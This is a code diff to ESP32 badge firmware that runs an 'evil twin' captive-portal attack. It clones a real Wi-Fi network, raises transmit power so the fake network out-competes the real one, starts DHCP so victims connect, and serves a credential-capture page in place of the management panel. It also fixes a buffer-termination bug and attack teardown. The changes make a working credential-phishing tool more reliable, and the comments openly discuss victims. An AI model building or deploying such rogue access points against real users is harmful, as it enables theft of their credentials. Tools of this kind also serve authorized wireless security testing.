@@ -480,7 +480,12 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
   }
 
   if (ap_config != "") {
-    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
+    // strncpy with n == sizeof(buffer) writes no terminator when the source is
+    // that long or longer, and the guards above admit a name of exactly
+    // MAX_AP_NAME_SIZE. apName was then read unterminated by softAP() and
+    // Serial.println() below, running off the end of the buffer.
+    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE - 1);
+    apName[MAX_AP_NAME_SIZE - 1] = '\0';
     this->has_ap = true;
     Serial.println("ap config set");
     return true;
@@ -993,6 +998,16 @@ void EvilPortal::setupManagementServer() {
     SPIFFS.remove("/portal.html");
     SPIFFS.rename("/portal_mgmt.html", "/portal.html");
     Serial.println("[MGMT] Management portal restored from backup");
+  }
+  // Restore the gzip twin too. mgmtServeFile() prefers it for every client that
+  // accepts gzip, so leaving it absent would serve the much larger plain file on
+  // every panel load, and leaving a stale one would serve the evil page back to
+  // the operator. Restored independently of the plain file so a reset at any
+  // point during the attack still converges to a working panel.
+  if (SPIFFS.exists("/portal_mgmt.html.gz")) {
+    SPIFFS.remove("/portal.html.gz");
+    SPIFFS.rename("/portal_mgmt.html.gz", "/portal.html.gz");
+    Serial.println("[MGMT] Management portal (gzip) restored from backup");
   }
 
   // Load persisted SSIDs from SPIFFS
@@ -2235,6 +2250,23 @@ void EvilPortal::setupManagementServer() {
       Serial.println("[MGMT] Management portal backed up");
     }
 
+    // The gzip twin must be moved aside as well, or the attack serves the wrong
+    // page. mgmtServeFile() prefers "<path>.gz" whenever the client sends
+    // Accept-Encoding: gzip, which every browser and phone does. Overwriting
+    // only the plain /portal.html therefore left the captive handler serving
+    // /portal.html.gz - the real management panel - to the victim, handing them
+    // this badge's control UI instead of the credential form. Renaming it (not
+    // deleting it) keeps the panel recoverable, and the restore below is
+    // symmetric. The rename is also self-healing: if the badge resets mid-attack
+    // the restore runs from setupManagementServer() on the next boot.
+    if (SPIFFS.exists("/portal.html.gz") && !SPIFFS.exists("/portal_mgmt.html.gz")) {
+      SPIFFS.rename("/portal.html.gz", "/portal_mgmt.html.gz");
+      Serial.println("[MGMT] Management portal (gzip) moved aside for evil twin");
+    } else if (SPIFFS.exists("/portal.html.gz")) {
+      // A backup already exists from an earlier attack; this copy is stale.
+      SPIFFS.remove("/portal.html.gz");
+    }
+
     // Write evil portal HTML as /portal.html so the captive handler serves it
     File f = SPIFFS.open("/portal.html", "w");
     f.print(html);
@@ -2255,10 +2287,64 @@ void EvilPortal::setupManagementServer() {
     WiFi.softAPdisconnect(true);
     delay(300);
 
-    // Start evil portal AP directly (no need for ssids/access_points lists)
-    WiFi.mode(WIFI_AP);
+    // Bring the evil AP up exactly the way rearmManagementAP() does, which is
+    // the only AP sequence proven to work on this board. Four details were
+    // missing here and each one is load-bearing:
+    //   1. WIFI_AP_STA, not WIFI_AP. Dropping the STA interface breaks a later
+    //      scanNetworks(), which is why the management path deliberately keeps
+    //      it ("Bug2: preserve STA interface").
+    //   2. The softAP() result was discarded. Combined with DebugLevel=none,
+    //      which compiles out the core's own log_e(), a failed AP left no trace
+    //      anywhere: the firmware announced "READY" for a network that never
+    //      existed, and the 200 OK had already been sent to the panel.
+    //   3. TX power was never set, so the evil AP silently inherited the 8.5dBm
+    //      that the management AP lowers it to - far too weak to out-compete
+    //      the real network it is cloning.
+    //   4. No DHCP server. softAP() does not reliably start it on this core, so
+    //      a victim could associate and then sit without an IP, never reaching
+    //      the portal. The management path starts it explicitly for this reason.
+    WiFi.mode(WIFI_AP_STA);
     delay(200);
-    WiFi.softAP(apName, "", ch);
+    bool ap_ok = WiFi.softAP(apName, "", ch);
+    if (ap_ok) WiFi.setTxPower(WIFI_POWER_20dBm);
+
+    if (!ap_ok) {
+      // Management was already torn down above, so failing silently here takes
+      // the badge off the air completely - and with duration 0 nothing would
+      // ever rearm it, which is exactly how this looked from the outside: no
+      // evil network and no panel either. Hand the badge back to the REARM
+      // branch of mgmtServiceJob() rather than restoring inline; that path is
+      // already tested and its setupManagementServer() also puts both portal
+      // files back. The reason reaches the operator through SerialMirror, which
+      // the panel log reads once it is reachable again.
+      Serial.println("[MGMT] Evil Twin FAILED: could not create AP \"" +
+                     String(apName) + "\" on channel " + String(ch) +
+                     " - restoring management AP");
+      this->has_ap    = false;
+      this->has_html  = false;
+      this->runServer = false;
+      this->dnsServer.stop();
+      this->mgmt_job_state = MGMT_JOB_REARM;
+      return;
+    }
+
+    // DHCP server: mirror the management path. Without this an associated
+    // victim gets no IP and never loads the portal.
+    esp_netif_t *et_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (et_netif) {
+      esp_netif_dhcp_status_t et_st = ESP_NETIF_DHCP_INIT;
+      esp_netif_dhcps_get_status(et_netif, &et_st);
+      if (et_st != ESP_NETIF_DHCP_STARTED) {
+        esp_err_t et_err = esp_netif_dhcps_start(et_netif);
+        Serial.printf("[MGMT] Evil Twin DHCP was %d, start -> %d\n",
+                      (int)et_st, (int)et_err);
+      }
+      esp_netif_dhcps_get_status(et_netif, &et_st);
+      Serial.printf("[MGMT] Evil Twin AP up ip=%s dhcps=%s\n",
+                    WiFi.softAPIP().toString().c_str(),
+                    et_st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF");
+    }
+
     Serial.println("[MGMT] Evil Twin AP: " + String(apName) + " IP: " + WiFi.softAPIP().toString());
 
     // DNS wildcard for captive portal
@@ -2809,18 +2895,23 @@ void EvilPortal::mgmtServiceJob() {
         delay(200);
         ESP.restart();
       }
-      this->mgmt_job_state = MGMT_JOB_REARM;
-      this->mgmt_job_t0    = now;
-    }
-    // G: Bug G — check evil twin duration expiry
-    if (this->mgmt_job_kind == "eviltwin" &&
-        this->mgmt_job_duration_s > 0 &&
-        now - this->mgmt_job_t0 >= this->mgmt_job_duration_s * 1000UL) {
-      Serial.println("[MGMT] evil twin duration expired; stopping portal + rearm");
-      this->runServer = false;
-      server.stop();
-      dnsServer.stop();
-      WiFi.softAPdisconnect(true);
+
+      // Evil twin is the only attack kind that owns the web server and the DNS
+      // server, so it needs an explicit teardown. This used to sit in a second
+      // `if` below and was dead code: the block above already assigned
+      // mgmt_job_t0 = now, so that test compared now against now and could
+      // never be true for any non-zero duration. The result was a DNS server
+      // still answering every query after the attack ended, plus the captive
+      // portal routes left registered alongside the management ones, and
+      // server.begin() being called on a server that was never stopped.
+      if (this->mgmt_job_kind == "eviltwin") {
+        Serial.println("[MGMT] evil twin duration expired; stopping portal + DNS");
+        this->runServer = false;
+        server.stop();
+        dnsServer.stop();
+        WiFi.softAPdisconnect(true);
+      }
+
       this->mgmt_job_state = MGMT_JOB_REARM;
       this->mgmt_job_t0    = now;
     }
